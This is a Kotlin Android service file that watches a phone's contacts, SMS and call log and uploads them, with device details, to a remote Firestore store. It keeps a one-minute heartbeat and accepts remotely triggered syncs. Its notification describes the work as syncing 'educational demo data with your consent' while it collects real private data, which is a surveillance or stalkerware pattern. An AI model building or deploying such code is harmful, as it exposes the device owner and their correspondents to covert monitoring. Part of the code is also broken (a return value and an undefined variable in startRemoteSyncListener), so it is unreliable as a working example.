package com.boxx.datasync.sync

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.preference.PreferenceManager
import com.boxx.datasync.MainActivity
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.utils.DataHelper
import com.boxx.datasync.utils.DeviceIdHelper
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.collectLatest
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class SyncService : Service() {
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    @Inject lateinit var repository: DataRepository

    private lateinit var deviceId: String
    private var syncJob: Job? = null
    private var remoteSyncJob: Job? = null
    private var heartbeatJob: Job? = null
    private lateinit var observer: DataContentObserver

    override fun onCreate() {
        super.onCreate()
        deviceId = DeviceIdHelper.getDeviceId(this)
        createNotificationChannel()
        startForegroundCompat(createNotification())
        Log.d("SyncService", "SYNC_SERVICE_STARTED")
        registerObservers()
        startRemoteSyncListener()
        startHeartbeat()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        syncJob?.cancel()
        syncJob = serviceScope.launch { performSync(isFullSync = intent?.getBooleanExtra(SyncScheduler.KEY_FULL_SYNC, false) == true) }
        return START_NOT_STICKY
    }

    private fun registerObservers() {
        observer = DataContentObserver(this)
        try {
            contentResolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, observer)
            contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, observer)
            contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, observer)
        } catch (e: SecurityException) {
            Log.e("SyncService", "Missing permission while registering observers", e)
        }
    }

    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = serviceScope.launch {
            while (true) {
                repository.updateHeartbeat(deviceId)
                Log.d("SyncService", "HEARTBEAT_UPDATED")
                delay(60_000)
            }
        }
    }

    private fun startRemoteSyncListener() {
        var lastHandled = PreferenceManager.getDefaultSharedPreferences(this).getLong("last_handled_sync_request", 0L)
        remoteSyncJob?.cancel()
        remoteSyncJob = serviceScope.launch {
            repository.observeSyncRequests(deviceId).collectLatest { requestedAt ->
                if (requestedAt > lastHandled) {
                    lastHandled = requestedAt
                    PreferenceManager.getDefaultSharedPreferences(this@SyncService).edit().putLong("last_handled_sync_request", lastHandled).apply()
                    performSync(isFullSync = false)
                }
                stopSelf(startId)
            }
        }
        return START_NOT_STICKY
    }

    private suspend fun performSync(isFullSync: Boolean) {
        val prefs = PreferenceManager.getDefaultSharedPreferences(this)
        val now = System.currentTimeMillis()
        try {
            repository.updateDeviceInfoMap(deviceId, baseDeviceMap(now) + mapOf("syncStatus" to "Syncing", "lastError" to null))
            try {
                repository.testDeviceWrite(deviceId)
                Log.d("SyncService", "SYNC_FIREBASE_TEST_WRITE_SUCCESS")
            } catch (e: Exception) {
                Log.e("SyncService", "SYNC_FIREBASE_TEST_WRITE_FAILED", e)
                throw e
            }

            val lastSmsSync = if (isFullSync) 0L else prefs.getLong("last_sms_sync", 0L)
            val lastCallSync = if (isFullSync) 0L else prefs.getLong("last_call_sync", 0L)
            val lastContactSync = if (isFullSync) 0L else prefs.getLong("last_contact_sync", 0L)

            val contacts = if (hasPermission(android.Manifest.permission.READ_CONTACTS)) DataHelper.fetchContacts(this, lastContactSync) else emptyList()
            val sms = if (hasPermission(android.Manifest.permission.READ_SMS)) DataHelper.fetchSMS(this, lastSmsSync) else emptyList()
            val calls = if (hasPermission(android.Manifest.permission.READ_CALL_LOG)) DataHelper.fetchCallLogs(this, lastCallSync) else emptyList()
            repository.syncIncremental(deviceId, contacts, sms, calls)

            prefs.edit().apply {
                if (contacts.isNotEmpty()) putLong("last_contact_sync", now)
                if (sms.isNotEmpty()) putLong("last_sms_sync", sms.maxOf { it.date })
                if (calls.isNotEmpty()) putLong("last_call_sync", calls.maxOf { it.date })
            }.apply()

            repository.updateDeviceInfoMap(deviceId, baseDeviceMap(System.currentTimeMillis()) + mapOf(
                "lastSyncTime" to System.currentTimeMillis(),
                "syncStatus" to "Synced",
                "lastError" to null,
                "contactCount" to if (hasPermission(android.Manifest.permission.READ_CONTACTS)) DataHelper.fetchContacts(this).size else 0,
                "smsCount" to if (hasPermission(android.Manifest.permission.READ_SMS)) DataHelper.fetchSMS(this).size else 0,
                "callCount" to if (hasPermission(android.Manifest.permission.READ_CALL_LOG)) DataHelper.fetchCallLogs(this).size else 0
            ))
            Log.d("SyncService", "SYNC_FIRESTORE_UPLOAD_SUCCESS")
        } catch (e: Exception) {
            val message = e.localizedMessage ?: e.message ?: e.javaClass.simpleName
            Log.e("SyncService", "SYNC_FIRESTORE_UPLOAD_FAILED", e)
            repository.updateDeviceInfoMap(deviceId, baseDeviceMap(System.currentTimeMillis()) + mapOf(
                "lastSyncTime" to System.currentTimeMillis(),
                "syncStatus" to "Error",
                "lastError" to message
            ))
        } finally {
            Log.d("SyncService", "SYNC_SERVICE_STOPPED")
            stopSelf()
        }
    }

    private fun baseDeviceMap(now: Long): Map<String, Any?> = mapOf(
        "deviceId" to deviceId,
        "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
        "manufacturer" to Build.MANUFACTURER,
        "model" to Build.MODEL,
        "osVersion" to Build.VERSION.RELEASE,
        "heartbeatAt" to now,
        "timestamp" to now
    )

    private fun hasPermission(permission: String) = ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED

    private fun startForegroundCompat(notification: Notification) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) startForeground(1, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC) else startForeground(1, notification)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) getSystemService(NotificationManager::class.java)
            ?.createNotificationChannel(NotificationChannel("sync_channel", "Data Sync Service", NotificationManager.IMPORTANCE_LOW))
    }

    private fun createNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        return NotificationCompat.Builder(this, "sync_channel")
            .setContentTitle("Data Sync")
            .setContentText("Syncing educational demo data with your consent")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        runCatching { contentResolver.unregisterContentObserver(observer) }
        serviceScope.cancel()
        super.onDestroy()
    }
}
